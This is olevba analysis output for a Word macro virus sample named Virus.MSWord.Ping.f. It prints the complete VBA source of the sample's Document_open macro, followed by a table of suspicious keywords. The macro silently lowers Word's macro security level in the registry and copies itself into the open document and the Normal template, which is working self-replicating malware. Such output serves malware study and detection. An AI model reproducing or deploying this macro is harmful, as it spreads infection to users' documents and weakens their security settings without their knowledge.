olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ping.f-a9d615db5bc93e92fdb934ba1a7dd70ffb09bf8b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ping.f-a9d615db5bc93e92fdb934ba1a7dd70ffb09bf8b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Ping.f-a9d615db5bc93e92fdb934ba1a7dd70ffb09bf8b - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NorTEmp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Start_line = ThisDoc.ProcStartLine("document_open", vbext_pk_Proc)
If AcDoc.countoflines <> 0 Then
Ad_Lines = AcDoc.Lines(Start_line, AcDoc.countoflines)
If InStr(Ad_Lines, ThisDoc.Lines(Start_line, 27)) = 0 Then
AcDoc.AddFromString ThisDoc.Lines(Start_line, 27)
End If
Else
AcDoc.AddFromString ThisDoc.Lines(Start_line, 27)
End If
If NorTEmp.countoflines <> 0 Then
Nt_lines = NorTEmp.Lines(Start_line, NorTEmp.countoflines)
If InStr(Nt_lines, ThisDoc.Lines(Start_line, 27)) = 0 Then
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 27)
End If
Else
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 27)
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

